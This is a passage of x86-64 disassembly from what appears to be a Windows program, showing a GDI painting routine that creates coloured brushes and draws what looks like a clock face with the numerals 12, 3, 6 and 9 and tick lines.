  401fa4:	48 89 f3             	mov    %rsi,%rbx
  401fa7:	45 0f b7 4f 48       	movzwl 0x48(%r15),%r9d
  401fac:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401fb3:	00 00 
  401fb5:	41 ff d4             	call   *%r12
  401fb8:	85 c0                	test   %eax,%eax
  401fba:	74 c4                	je     0x401f80
  401fbc:	48 89 f2             	mov    %rsi,%rdx
  401fbf:	48 8d 8c 24 f0 02 00 	lea    0x2f0(%rsp),%rcx
  401fc6:	00 
  401fc7:	4c 8b 05 3e 07 16 00 	mov    0x16073e(%rip),%r8        # 0x56270c
  401fce:	41 ff d0             	call   *%r8
  401fd1:	85 c0                	test   %eax,%eax
  401fd3:	75 ab                	jne    0x401f80
  401fd5:	49 8d 4f 48          	lea    0x48(%r15),%rcx
  401fd9:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401fde:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401fe3:	ff d0                	call   *%rax
  401fe5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401fea:	49 8d 4f 58          	lea    0x58(%r15),%rcx
  401fee:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401ff3:	ff d0                	call   *%rax
  401ff5:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401ffa:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401ffe:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  402003:	ff d0                	call   *%rax
  402005:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  40200a:	e8 21 89 00 00       	call   0x40a930
  40200f:	48 89 e9             	mov    %rbp,%rcx
  402012:	ff 15 14 05 16 00    	call   *0x160514(%rip)        # 0x56252c
  402018:	b8 01 00 00 00       	mov    $0x1,%eax
  40201d:	eb 0c                	jmp    0x40202b
  40201f:	90                   	nop
  402020:	48 89 e9             	mov    %rbp,%rcx
  402023:	ff 15 03 05 16 00    	call   *0x160503(%rip)        # 0x56252c
  402029:	31 c0                	xor    %eax,%eax
  40202b:	48 81 c4 18 07 00 00 	add    $0x718,%rsp
  402032:	5b                   	pop    %rbx
  402033:	5e                   	pop    %rsi
  402034:	5f                   	pop    %rdi
  402035:	5d                   	pop    %rbp
  402036:	41 5c                	pop    %r12
  402038:	41 5d                	pop    %r13
  40203a:	41 5e                	pop    %r14
  40203c:	41 5f                	pop    %r15
  40203e:	c3                   	ret
  40203f:	90                   	nop
  402040:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  402045:	eb b3                	jmp    0x401ffa
  402047:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40204e:	00 00 
  402050:	41 57                	push   %r15
  402052:	41 56                	push   %r14
  402054:	41 55                	push   %r13
  402056:	41 54                	push   %r12
  402058:	55                   	push   %rbp
  402059:	57                   	push   %rdi
  40205a:	56                   	push   %rsi
  40205b:	53                   	push   %rbx
  40205c:	48 81 ec 68 01 00 00 	sub    $0x168,%rsp
  402063:	0f 29 b4 24 00 01 00 	movaps %xmm6,0x100(%rsp)
  40206a:	00 
  40206b:	0f 29 bc 24 10 01 00 	movaps %xmm7,0x110(%rsp)
  402072:	00 
  402073:	44 0f 29 84 24 20 01 	movaps %xmm8,0x120(%rsp)
  40207a:	00 00 
  40207c:	44 0f 29 8c 24 30 01 	movaps %xmm9,0x130(%rsp)
  402083:	00 00 
  402085:	44 0f 29 94 24 40 01 	movaps %xmm10,0x140(%rsp)
  40208c:	00 00 
  40208e:	44 0f 29 9c 24 50 01 	movaps %xmm11,0x150(%rsp)
  402095:	00 00 
  402097:	41 b8 a5 2a 2a 00    	mov    $0x2a2aa5,%r8d
  40209d:	ba 28 00 00 00       	mov    $0x28,%edx
  4020a2:	48 89 ce             	mov    %rcx,%rsi
  4020a5:	31 c9                	xor    %ecx,%ecx
  4020a7:	4c 8d a4 24 d0 00 00 	lea    0xd0(%rsp),%r12
  4020ae:	00 
  4020af:	48 8b 1d 06 04 16 00 	mov    0x160406(%rip),%rbx        # 0x5624bc
  4020b6:	ff d3                	call   *%rbx
  4020b8:	4c 8b 15 45 04 16 00 	mov    0x160445(%rip),%r10        # 0x562504
  4020bf:	48 89 c2             	mov    %rax,%rdx
  4020c2:	48 89 f1             	mov    %rsi,%rcx
  4020c5:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
  4020cc:	00 
  4020cd:	4c 89 94 24 88 00 00 	mov    %r10,0x88(%rsp)
  4020d4:	00 
  4020d5:	41 ff d2             	call   *%r10
  4020d8:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
  4020df:	00 
  4020e0:	8b 05 4e 90 00 00    	mov    0x904e(%rip),%eax        # 0x40b134
  4020e6:	8b 0d 4c 90 00 00    	mov    0x904c(%rip),%ecx        # 0x40b138
  4020ec:	48 8b 3d e9 03 16 00 	mov    0x1603e9(%rip),%rdi        # 0x5624dc
  4020f3:	44 8d 80 be 00 00 00 	lea    0xbe(%rax),%r8d
  4020fa:	44 8d 89 be 00 00 00 	lea    0xbe(%rcx),%r9d
  402101:	8d 91 42 ff ff ff    	lea    -0xbe(%rcx),%edx
  402107:	48 89 f1             	mov    %rsi,%rcx
  40210a:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  40210f:	44 8d 80 42 ff ff ff 	lea    -0xbe(%rax),%r8d
  402116:	ff d7                	call   *%rdi
  402118:	45 31 c0             	xor    %r8d,%r8d
  40211b:	ba 03 00 00 00       	mov    $0x3,%edx
  402120:	31 c9                	xor    %ecx,%ecx
  402122:	ff d3                	call   *%rbx
  402124:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  40212b:	00 
  40212c:	48 89 c2             	mov    %rax,%rdx
  40212f:	48 89 f1             	mov    %rsi,%rcx
  402132:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
  402139:	00 
  40213a:	41 ff d2             	call   *%r10
  40213d:	8b 05 f1 8f 00 00    	mov    0x8ff1(%rip),%eax        # 0x40b134
  402143:	8b 0d ef 8f 00 00    	mov    0x8fef(%rip),%ecx        # 0x40b138
  402149:	44 8d 80 b4 00 00 00 	lea    0xb4(%rax),%r8d
  402150:	44 8d 89 b4 00 00 00 	lea    0xb4(%rcx),%r9d
  402157:	8d 91 4c ff ff ff    	lea    -0xb4(%rcx),%edx
  40215d:	48 89 f1             	mov    %rsi,%rcx
  402160:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  402165:	44 8d 80 4c ff ff ff 	lea    -0xb4(%rax),%r8d
  40216c:	ff d7                	call   *%rdi
  40216e:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  402174:	ba 03 00 00 00       	mov    $0x3,%edx
  402179:	31 c9                	xor    %ecx,%ecx
  40217b:	ff d3                	call   *%rbx
  40217d:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  402184:	00 
  402185:	48 89 c2             	mov    %rax,%rdx
  402188:	48 89 f1             	mov    %rsi,%rcx
  40218b:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  402192:	00 
  402193:	41 ff d2             	call   *%r10
  402196:	8b 05 98 8f 00 00    	mov    0x8f98(%rip),%eax        # 0x40b134
  40219c:	8b 0d 96 8f 00 00    	mov    0x8f96(%rip),%ecx        # 0x40b138
  4021a2:	44 8d 40 0a          	lea    0xa(%rax),%r8d
  4021a6:	8d 51 f6             	lea    -0xa(%rcx),%edx
  4021a9:	44 8d 49 0a          	lea    0xa(%rcx),%r9d
  4021ad:	48 89 f1             	mov    %rsi,%rcx
  4021b0:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  4021b5:	44 8d 40 f6          	lea    -0xa(%rax),%r8d
  4021b9:	ff d7                	call   *%rdi
  4021bb:	48 8d 05 cc b0 15 00 	lea    0x15b0cc(%rip),%rax        # 0x55d28e
  4021c2:	45 31 c9             	xor    %r9d,%r9d
  4021c5:	45 31 c0             	xor    %r8d,%r8d
  4021c8:	ba 14 00 00 00       	mov    $0x14,%edx
  4021cd:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  4021d2:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  4021d9:	00 
  4021da:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
  4021df:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
  4021e6:	00 
  4021e7:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
  4021ee:	00 
  4021ef:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
  4021f6:	00 
  4021f7:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
  4021fe:	00 
  4021ff:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  402206:	00 
  402207:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  40220e:	00 
  40220f:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  402216:	00 
  402217:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  40221e:	00 
  40221f:	ff 15 8f 02 16 00    	call   *0x16028f(%rip)        # 0x5624b4
  402225:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  40222c:	00 
  40222d:	48 89 c2             	mov    %rax,%rdx
  402230:	48 89 f1             	mov    %rsi,%rcx
  402233:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  40223a:	00 
  40223b:	41 ff d2             	call   *%r10
  40223e:	ba cd 5c 5c 00       	mov    $0x5c5ccd,%edx
  402243:	48 89 f1             	mov    %rsi,%rcx
  402246:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
  40224d:	00 
  40224e:	ff 15 c0 02 16 00    	call   *0x1602c0(%rip)        # 0x562514
  402254:	ba 01 00 00 00       	mov    $0x1,%edx
  402259:	48 89 f1             	mov    %rsi,%rcx
  40225c:	ff 15 aa 02 16 00    	call   *0x1602aa(%rip)        # 0x56250c
  402262:	48 8d 15 2e b0 15 00 	lea    0x15b02e(%rip),%rdx        # 0x55d297
  402269:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
  40226f:	4c 89 e1             	mov    %r12,%rcx
  402272:	c7 84 24 f0 00 00 00 	movl   $0xc,0xf0(%rsp)
  402279:	0c 00 00 00 
  40227d:	c7 84 24 f4 00 00 00 	movl   $0x3,0xf4(%rsp)
  402284:	03 00 00 00 
  402288:	c7 84 24 f8 00 00 00 	movl   $0x6,0xf8(%rsp)
  40228f:	06 00 00 00 
  402293:	c7 84 24 fc 00 00 00 	movl   $0x9,0xfc(%rsp)
  40229a:	09 00 00 00 
  40229e:	e8 95 86 00 00       	call   0x40a938
  4022a3:	4d 89 e0             	mov    %r12,%r8
  4022a6:	41 8b 10             	mov    (%r8),%edx
  4022a9:	49 83 c0 04          	add    $0x4,%r8
  4022ad:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4022b3:	f7 d2                	not    %edx
  4022b5:	21 d0                	and    %edx,%eax
  4022b7:	25 80 80 80 80       	and    $0x80808080,%eax
  4022bc:	74 e8                	je     0x4022a6
  4022be:	89 c2                	mov    %eax,%edx
  4022c0:	48 89 f1             	mov    %rsi,%rcx
  4022c3:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
  4022ca:	00 
  4022cb:	c1 ea 10             	shr    $0x10,%edx
  4022ce:	a9 80 80 00 00       	test   $0x8080,%eax
  4022d3:	48 8b 3d 0a 02 16 00 	mov    0x16020a(%rip),%rdi        # 0x5624e4
  4022da:	0f 44 c2             	cmove  %edx,%eax
  4022dd:	49 8d 50 02          	lea    0x2(%r8),%rdx
  4022e1:	4c 0f 44 c2          	cmove  %rdx,%r8
  4022e5:	00 c0                	add    %al,%al
  4022e7:	4c 89 e2             	mov    %r12,%rdx
  4022ea:	49 83 d8 03          	sbb    $0x3,%r8
  4022ee:	45 29 e0             	sub    %r12d,%r8d
  4022f1:	ff d7                	call   *%rdi
  4022f3:	4c 89 e1             	mov    %r12,%rcx
  4022f6:	8b 11                	mov    (%rcx),%edx
  4022f8:	48 83 c1 04          	add    $0x4,%rcx
  4022fc:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  402302:	f7 d2                	not    %edx
  402304:	21 d0                	and    %edx,%eax
  402306:	25 80 80 80 80       	and    $0x80808080,%eax
  40230b:	74 e9                	je     0x4022f6
  40230d:	89 c2                	mov    %eax,%edx
  40230f:	4d 89 e1             	mov    %r12,%r9
  402312:	48 8b 2d 03 02 16 00 	mov    0x160203(%rip),%rbp        # 0x56251c
  402319:	c1 ea 10             	shr    $0x10,%edx
  40231c:	a9 80 80 00 00       	test   $0x8080,%eax
  402321:	0f 44 c2             	cmove  %edx,%eax
  402324:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  402328:	48 0f 44 ca          	cmove  %rdx,%rcx
  40232c:	00 c0                	add    %al,%al
  40232e:	8b 84 24 e4 00 00 00 	mov    0xe4(%rsp),%eax
  402335:	48 83 d9 03          	sbb    $0x3,%rcx
  402339:	4c 29 e1             	sub    %r12,%rcx
  40233c:	89 c2                	mov    %eax,%edx
  40233e:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  402342:	8b 0d ec 8d 00 00    	mov    0x8dec(%rip),%ecx        # 0x40b134
  402348:	c1 ea 1f             	shr    $0x1f,%edx
  40234b:	01 d0                	add    %edx,%eax
  40234d:	8b 94 24 e0 00 00 00 	mov    0xe0(%rsp),%edx
  402354:	d1 f8                	sar    $1,%eax
  402356:	f7 d8                	neg    %eax
  402358:	41 89 d0             	mov    %edx,%r8d
  40235b:	41 c1 e8 1f          	shr    $0x1f,%r8d
  40235f:	41 01 d0             	add    %edx,%r8d
  402362:	8b 15 d0 8d 00 00    	mov    0x8dd0(%rip),%edx        # 0x40b138
  402368:	41 d1 f8             	sar    $1,%r8d
  40236b:	44 29 c2             	sub    %r8d,%edx
  40236e:	44 8d 84 01 79 ff ff 	lea    -0x87(%rcx,%rax,1),%r8d
  402375:	ff 
  402376:	48 89 f1             	mov    %rsi,%rcx
  402379:	ff d5                	call   *%rbp
  40237b:	44 8b 84 24 f4 00 00 	mov    0xf4(%rsp),%r8d
  402382:	00 
  402383:	48 8d 15 0d af 15 00 	lea    0x15af0d(%rip),%rdx        # 0x55d297
  40238a:	4c 89 e1             	mov    %r12,%rcx
  40238d:	e8 a6 85 00 00       	call   0x40a938
  402392:	4d 89 e0             	mov    %r12,%r8
  402395:	41 8b 10             	mov    (%r8),%edx
  402398:	49 83 c0 04          	add    $0x4,%r8
  40239c:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4023a2:	f7 d2                	not    %edx
  4023a4:	21 d0                	and    %edx,%eax
  4023a6:	25 80 80 80 80       	and    $0x80808080,%eax
  4023ab:	74 e8                	je     0x402395
  4023ad:	89 c2                	mov    %eax,%edx
  4023af:	48 89 f1             	mov    %rsi,%rcx
  4023b2:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
  4023b9:	00 
  4023ba:	c1 ea 10             	shr    $0x10,%edx
  4023bd:	a9 80 80 00 00       	test   $0x8080,%eax
  4023c2:	0f 44 c2             	cmove  %edx,%eax
  4023c5:	49 8d 50 02          	lea    0x2(%r8),%rdx
  4023c9:	4c 0f 44 c2          	cmove  %rdx,%r8
  4023cd:	00 c0                	add    %al,%al
  4023cf:	4c 89 e2             	mov    %r12,%rdx
  4023d2:	49 83 d8 03          	sbb    $0x3,%r8
  4023d6:	45 29 e0             	sub    %r12d,%r8d
  4023d9:	ff d7                	call   *%rdi
  4023db:	4c 89 e1             	mov    %r12,%rcx
  4023de:	8b 11                	mov    (%rcx),%edx
  4023e0:	48 83 c1 04          	add    $0x4,%rcx
  4023e4:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4023ea:	f7 d2                	not    %edx
  4023ec:	21 d0                	and    %edx,%eax
  4023ee:	25 80 80 80 80       	and    $0x80808080,%eax
  4023f3:	74 e9                	je     0x4023de
  4023f5:	89 c2                	mov    %eax,%edx
  4023f7:	4d 89 e1             	mov    %r12,%r9
  4023fa:	c1 ea 10             	shr    $0x10,%edx
  4023fd:	a9 80 80 00 00       	test   $0x8080,%eax
  402402:	0f 44 c2             	cmove  %edx,%eax
  402405:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  402409:	48 0f 44 ca          	cmove  %rdx,%rcx
  40240d:	00 c0                	add    %al,%al
  40240f:	8b 84 24 e4 00 00 00 	mov    0xe4(%rsp),%eax
  402416:	48 83 d9 03          	sbb    $0x3,%rcx
  40241a:	4c 29 e1             	sub    %r12,%rcx
  40241d:	41 89 c0             	mov    %eax,%r8d
  402420:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  402424:	48 89 f1             	mov    %rsi,%rcx
  402427:	41 c1 e8 1f          	shr    $0x1f,%r8d
  40242b:	41 01 c0             	add    %eax,%r8d
  40242e:	8b 84 24 e0 00 00 00 	mov    0xe0(%rsp),%eax
  402435:	41 d1 f8             	sar    $1,%r8d
  402438:	89 c2                	mov    %eax,%edx
  40243a:	c1 ea 1f             	shr    $0x1f,%edx
  40243d:	01 d0                	add    %edx,%eax
  40243f:	8b 15 f3 8c 00 00    	mov    0x8cf3(%rip),%edx        # 0x40b138
  402445:	d1 f8                	sar    $1,%eax
  402447:	f7 d8                	neg    %eax
  402449:	8d 94 02 86 00 00 00 	lea    0x86(%rdx,%rax,1),%edx
  402450:	8b 05 de 8c 00 00    	mov    0x8cde(%rip),%eax        # 0x40b134
  402456:	44 29 c0             	sub    %r8d,%eax
  402459:	41 89 c0             	mov    %eax,%r8d
  40245c:	ff d5                	call   *%rbp
  40245e:	44 8b 84 24 f8 00 00 	mov    0xf8(%rsp),%r8d
  402465:	00 
  402466:	48 8d 15 2a ae 15 00 	lea    0x15ae2a(%rip),%rdx        # 0x55d297
  40246d:	4c 89 e1             	mov    %r12,%rcx
  402470:	e8 c3 84 00 00       	call   0x40a938
  402475:	4d 89 e0             	mov    %r12,%r8
  402478:	41 8b 10             	mov    (%r8),%edx
  40247b:	49 83 c0 04          	add    $0x4,%r8
  40247f:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  402485:	f7 d2                	not    %edx
  402487:	21 d0                	and    %edx,%eax
  402489:	25 80 80 80 80       	and    $0x80808080,%eax
  40248e:	74 e8                	je     0x402478
  402490:	89 c2                	mov    %eax,%edx
  402492:	48 89 f1             	mov    %rsi,%rcx
  402495:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
  40249c:	00 
  40249d:	c1 ea 10             	shr    $0x10,%edx
  4024a0:	a9 80 80 00 00       	test   $0x8080,%eax
  4024a5:	0f 44 c2             	cmove  %edx,%eax
  4024a8:	49 8d 50 02          	lea    0x2(%r8),%rdx
  4024ac:	4c 0f 44 c2          	cmove  %rdx,%r8
  4024b0:	00 c0                	add    %al,%al
  4024b2:	4c 89 e2             	mov    %r12,%rdx
  4024b5:	49 83 d8 03          	sbb    $0x3,%r8
  4024b9:	45 29 e0             	sub    %r12d,%r8d
  4024bc:	ff d7                	call   *%rdi
  4024be:	4c 89 e1             	mov    %r12,%rcx
  4024c1:	8b 11                	mov    (%rcx),%edx
  4024c3:	48 83 c1 04          	add    $0x4,%rcx
  4024c7:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4024cd:	f7 d2                	not    %edx
  4024cf:	21 d0                	and    %edx,%eax
  4024d1:	25 80 80 80 80       	and    $0x80808080,%eax
  4024d6:	74 e9                	je     0x4024c1
  4024d8:	89 c2                	mov    %eax,%edx
  4024da:	4d 89 e1             	mov    %r12,%r9
  4024dd:	c1 ea 10             	shr    $0x10,%edx
  4024e0:	a9 80 80 00 00       	test   $0x8080,%eax
  4024e5:	0f 44 c2             	cmove  %edx,%eax
  4024e8:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  4024ec:	48 0f 44 ca          	cmove  %rdx,%rcx
  4024f0:	00 c0                	add    %al,%al
  4024f2:	8b 84 24 e4 00 00 00 	mov    0xe4(%rsp),%eax
  4024f9:	48 83 d9 03          	sbb    $0x3,%rcx
  4024fd:	4c 29 e1             	sub    %r12,%rcx
  402500:	89 c2                	mov    %eax,%edx
  402502:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  402506:	8b 0d 28 8c 00 00    	mov    0x8c28(%rip),%ecx        # 0x40b134
  40250c:	c1 ea 1f             	shr    $0x1f,%edx
  40250f:	01 d0                	add    %edx,%eax
  402511:	8b 94 24 e0 00 00 00 	mov    0xe0(%rsp),%edx
  402518:	d1 f8                	sar    $1,%eax
  40251a:	f7 d8                	neg    %eax
  40251c:	41 89 d0             	mov    %edx,%r8d
  40251f:	41 c1 e8 1f          	shr    $0x1f,%r8d
  402523:	41 01 d0             	add    %edx,%r8d
  402526:	8b 15 0c 8c 00 00    	mov    0x8c0c(%rip),%edx        # 0x40b138
  40252c:	41 d1 f8             	sar    $1,%r8d
  40252f:	44 29 c2             	sub    %r8d,%edx
  402532:	44 8d 84 01 86 00 00 	lea    0x86(%rcx,%rax,1),%r8d
  402539:	00 
  40253a:	48 89 f1             	mov    %rsi,%rcx
  40253d:	ff d5                	call   *%rbp
  40253f:	44 8b 84 24 fc 00 00 	mov    0xfc(%rsp),%r8d
  402546:	00 
  402547:	48 8d 15 49 ad 15 00 	lea    0x15ad49(%rip),%rdx        # 0x55d297
  40254e:	4c 89 e1             	mov    %r12,%rcx
  402551:	e8 e2 83 00 00       	call   0x40a938
  402556:	4d 89 e0             	mov    %r12,%r8
  402559:	41 8b 10             	mov    (%r8),%edx
  40255c:	49 83 c0 04          	add    $0x4,%r8
  402560:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  402566:	f7 d2                	not    %edx
  402568:	21 d0                	and    %edx,%eax
  40256a:	25 80 80 80 80       	and    $0x80808080,%eax
  40256f:	74 e8                	je     0x402559
  402571:	89 c2                	mov    %eax,%edx
  402573:	48 89 f1             	mov    %rsi,%rcx
  402576:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
  40257d:	00 
  40257e:	c1 ea 10             	shr    $0x10,%edx
  402581:	a9 80 80 00 00       	test   $0x8080,%eax
  402586:	0f 44 c2             	cmove  %edx,%eax
  402589:	49 8d 50 02          	lea    0x2(%r8),%rdx
  40258d:	4c 0f 44 c2          	cmove  %rdx,%r8
  402591:	00 c0                	add    %al,%al
  402593:	4c 89 e2             	mov    %r12,%rdx
  402596:	49 83 d8 03          	sbb    $0x3,%r8
  40259a:	45 29 e0             	sub    %r12d,%r8d
  40259d:	ff d7                	call   *%rdi
  40259f:	4c 89 e1             	mov    %r12,%rcx
  4025a2:	8b 11                	mov    (%rcx),%edx
  4025a4:	48 83 c1 04          	add    $0x4,%rcx
  4025a8:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4025ae:	f7 d2                	not    %edx
  4025b0:	21 d0                	and    %edx,%eax
  4025b2:	25 80 80 80 80       	and    $0x80808080,%eax
  4025b7:	74 e9                	je     0x4025a2
  4025b9:	89 c2                	mov    %eax,%edx
  4025bb:	44 8b 15 72 8b 00 00 	mov    0x8b72(%rip),%r10d        # 0x40b134
  4025c2:	4d 89 e1             	mov    %r12,%r9
  4025c5:	c1 ea 10             	shr    $0x10,%edx
  4025c8:	a9 80 80 00 00       	test   $0x8080,%eax
  4025cd:	41 be 06 00 00 00    	mov    $0x6,%r14d
  4025d3:	0f 44 c2             	cmove  %edx,%eax
  4025d6:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  4025da:	41 bf 67 66 66 66    	mov    $0x66666667,%r15d
  4025e0:	48 0f 44 ca          	cmove  %rdx,%rcx
  4025e4:	00 c0                	add    %al,%al
  4025e6:	8b 84 24 e4 00 00 00 	mov    0xe4(%rsp),%eax
  4025ed:	48 83 d9 03          	sbb    $0x3,%rcx
  4025f1:	4c 29 e1             	sub    %r12,%rcx
  4025f4:	41 89 c0             	mov    %eax,%r8d
  4025f7:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  4025fb:	48 89 f1             	mov    %rsi,%rcx
  4025fe:	41 c1 e8 1f          	shr    $0x1f,%r8d
  402602:	41 01 c0             	add    %eax,%r8d
  402605:	8b 84 24 e0 00 00 00 	mov    0xe0(%rsp),%eax
  40260c:	41 d1 f8             	sar    $1,%r8d
  40260f:	45 29 c2             	sub    %r8d,%r10d
  402612:	89 c2                	mov    %eax,%edx
  402614:	45 89 d0             	mov    %r10d,%r8d
  402617:	c1 ea 1f             	shr    $0x1f,%edx
  40261a:	01 d0                	add    %edx,%eax
  40261c:	8b 15 16 8b 00 00    	mov    0x8b16(%rip),%edx        # 0x40b138
  402622:	d1 f8                	sar    $1,%eax
  402624:	f7 d8                	neg    %eax
  402626:	8d 94 02 7a ff ff ff 	lea    -0x86(%rdx,%rax,1),%edx
  40262d:	ff d5                	call   *%rbp
  40262f:	45 31 c0             	xor    %r8d,%r8d
  402632:	31 c9                	xor    %ecx,%ecx
  402634:	ba 03 00 00 00       	mov    $0x3,%edx
  402639:	ff d3                	call   *%rbx
  40263b:	48 89 f1             	mov    %rsi,%rcx
  40263e:	48 89 c2             	mov    %rax,%rdx
  402641:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  402648:	00 
  402649:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
  402650:	00 
  402651:	41 ff d2             	call   *%r10
  402654:	8b 3d de 8a 00 00    	mov    0x8ade(%rip),%edi        # 0x40b138
  40265a:	8b 2d d4 8a 00 00    	mov    0x8ad4(%rip),%ebp        # 0x40b134
  402660:	45 31 c9             	xor    %r9d,%r9d
  402663:	4c 8b 15 8a fe 15 00 	mov    0x15fe8a(%rip),%r10        # 0x5624f4
  40266a:	48 89 f1             	mov    %rsi,%rcx
  40266d:	44 8d 85 51 ff ff ff 	lea    -0xaf(%rbp),%r8d
  402674:	89 fa                	mov    %edi,%edx
  402676:	4c 89 94 24 80 00 00 	mov    %r10,0x80(%rsp)
  40267d:	00 
  40267e:	41 ff d2             	call   *%r10
  402681:	4c 8b 15 64 fe 15 00 	mov    0x15fe64(%rip),%r10        # 0x5624ec
  402688:	44 8d 85 65 ff ff ff 	lea    -0x9b(%rbp),%r8d
  40268f:	89 fa                	mov    %edi,%edx
  402691:	48 89 f1             	mov    %rsi,%rcx
  402694:	4c 89 54 24 78       	mov    %r10,0x78(%rsp)
  402699:	41 ff d2             	call   *%r10
  40269c:	8b 2d 96 8a 00 00    	mov    0x8a96(%rip),%ebp        # 0x40b138
  4026a2:	8b 3d 8c 8a 00 00    	mov    0x8a8c(%rip),%edi        # 0x40b134
  4026a8:	45 31 c9             	xor    %r9d,%r9d
  4026ab:	48 89 f1             	mov    %rsi,%rcx
  4026ae:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4026b5:	00 
  4026b6:	8d 55 57             	lea    0x57(%rbp),%edx
  4026b9:	44 8d 87 69 ff ff ff 	lea    -0x97(%rdi),%r8d
  4026c0:	41 ff d2             	call   *%r10
  4026c3:	8d 55 4d             	lea    0x4d(%rbp),%edx
  4026c6:	44 8d 87 7a ff ff ff 	lea    -0x86(%rdi),%r8d
  4026cd:	48 89 f1             	mov    %rsi,%rcx
  4026d0:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  4026d5:	41 ff d2             	call   *%r10
  4026d8:	8b 2d 5a 8a 00 00    	mov    0x8a5a(%rip),%ebp        # 0x40b138
  4026de:	8b 3d 50 8a 00 00    	mov    0x8a50(%rip),%edi        # 0x40b134
  4026e4:	45 31 c9             	xor    %r9d,%r9d
  4026e7:	48 89 f1             	mov    %rsi,%rcx
  4026ea:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4026f1:	00 
  4026f2:	8d 95 97 00 00 00    	lea    0x97(%rbp),%edx
  4026f8:	44 8d 47 a9          	lea    -0x57(%rdi),%r8d
  4026fc:	41 ff d2             	call   *%r10
  4026ff:	8d 95 86 00 00 00    	lea    0x86(%rbp),%edx
  402705:	44 8d 47 b3          	lea    -0x4d(%rdi),%r8d
  402709:	48 89 f1             	mov    %rsi,%rcx
  40270c:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  402711:	41 ff d2             	call   *%r10
  402714:	8b 2d 1e 8a 00 00    	mov    0x8a1e(%rip),%ebp        # 0x40b138
  40271a:	8b 3d 14 8a 00 00    	mov    0x8a14(%rip),%edi        # 0x40b134
  402720:	45 31 c9             	xor    %r9d,%r9d
  402723:	48 89 f1             	mov    %rsi,%rcx
  402726:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  40272d:	00 
  40272e:	8d 95 ae 00 00 00    	lea    0xae(%rbp),%edx
  402734:	41 89 f8             	mov    %edi,%r8d
  402737:	41 ff d2             	call   *%r10
  40273a:	8d 95 9a 00 00 00    	lea    0x9a(%rbp),%edx
  402740:	41 89 f8             	mov    %edi,%r8d
  402743:	48 89 f1             	mov    %rsi,%rcx
  402746:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  40274b:	41 ff d2             	call   *%r10
  40274e:	8b 2d e4 89 00 00    	mov    0x89e4(%rip),%ebp        # 0x40b138
  402754:	8b 3d da 89 00 00    	mov    0x89da(%rip),%edi        # 0x40b134
  40275a:	45 31 c9             	xor    %r9d,%r9d
  40275d:	48 89 f1             	mov    %rsi,%rcx
  402760:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  402767:	00 
  402768:	8d 95 97 00 00 00    	lea    0x97(%rbp),%edx
  40276e:	44 8d 47 57          	lea    0x57(%rdi),%r8d
  402772:	41 ff d2             	call   *%r10
